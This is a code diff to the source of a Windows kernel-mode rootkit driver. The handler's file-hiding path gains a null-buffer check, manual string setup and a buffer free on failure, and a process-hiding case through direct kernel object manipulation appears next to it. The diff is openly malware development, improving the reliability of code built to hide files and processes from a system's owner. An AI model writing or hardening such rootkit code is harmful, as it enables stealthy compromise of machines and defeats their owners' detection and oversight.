@@ -393,7 +393,14 @@ NTSTATUS roothook::HookHandler(PVOID hookedf_params) {
 		Return = HideFileObjectRK(RootkInstructions);
 		if (Return == HIDE_TEMPSUC) {
 			// Returned from regular file hiding:
-			RtlInitUnicodeString(&FileName, (WCHAR*)FileNameBuffer);
+			if (FileNameBuffer == NULL) {
+				DbgPrintEx(0, 0, "KMDFdriver Requests - Hide file object failed (impossible name buffer = NULL)\n");
+				DbgPrintEx(0, 0, "\n-=-=-=-=-=REQUEST ENDED=-=-=-=-=-\n\n");
+				return general_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_MEMALLOC, STATUS_MEMORY_NOT_ALLOCATED, RootkInstructions);
+			}
+			FileName.Buffer = (WCHAR*)FileNameBuffer;
+			FileName.Length = (USHORT)(wcslen((WCHAR*)FileNameBuffer) * sizeof(WCHAR));
+			FileName.MaximumLength = FileName.Length;
 			if (!HookHide.AddToHideFile(&FileName)) {
 				DbgPrintEx(0, 0, "KMDFdriver Requests - Hide file object failed (Failed to add file/folder name %wZ to hiding list)\n", FileName);
 				DbgPrintEx(0, 0, "\n-=-=-=-=-=REQUEST ENDED=-=-=-=-=-\n\n");
@@ -437,6 +444,9 @@ NTSTATUS roothook::HookHandler(PVOID hookedf_params) {
 
 		DbgPrintEx(0, 0, "KMDFdriver Requests - Hide file object failed (Failed to make basic operation)\n");
 		DbgPrintEx(0, 0, "\n-=-=-=-=-=REQUEST ENDED=-=-=-=-=-\n\n");
+		if (FileNameBuffer != NULL) {
+			ExFreePool(FileNameBuffer);
+		}
 		return Return;
 	case RKOP_HIDEPROC:
 		// Hide process with DKOM:
